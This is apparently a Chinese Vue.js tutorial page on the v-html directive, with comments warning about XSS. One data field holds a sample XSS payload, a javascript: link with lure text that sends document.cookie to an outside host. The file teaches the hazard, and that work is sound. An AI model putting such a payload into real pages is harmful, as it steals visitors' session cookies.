<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>v-html指令</title>
        <!-- 引入Vue -->
        <script type="text/javascript" src="../js/vue.js"></script>
    </head>
    <body>
        <!--
        v-html 指令：
        	1、作用：向指定节点中渲染包含 html 结构的内容。
        	2、与插值语法的区别：
        	           (1) v-html 会替换掉节点中所有的内容！
        	           (2) v-html 可以识别 html 结构！
        	3、严重注意：v-html 有安全性问题！！！！
        	           (1) 在网站上动态渲染任意 HTML 是非常危险的，容易导致 XSS 攻击。
                            XSS 攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。
                            这些恶意网页程序通常是 JavaScript，但实际上也可以包括 Java、 VBScript、ActiveX、 Flash 或者甚至是普通的 HTML。
                            攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和 cookie 等各种内容。
        	                XSS 科普：https://www.bilibili.com/video/BV1s5411s7qd?share_source=copy_web&vd_source=f142a37c45de7b8323eedf220d9dcdd1
        	           (2) 一定要在可信的内容上使用 v-html，永不要用在用户提交的内容上使用！
         -->
        <div id="root">
            <div>你好，{{name}}</div>
            <div v-html="str">这里有内容</div>
            <div v-html="str2"></div>
        </div>
    </body>

    <script type="text/javascript">
        Vue.config.productionTip = false;

        new Vue({
            el: '#root',
            data: {
                name: '尚硅谷',
                str: '<h3>你好啊！</h3>',
                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>'
            }
        });
    </script>
</html>
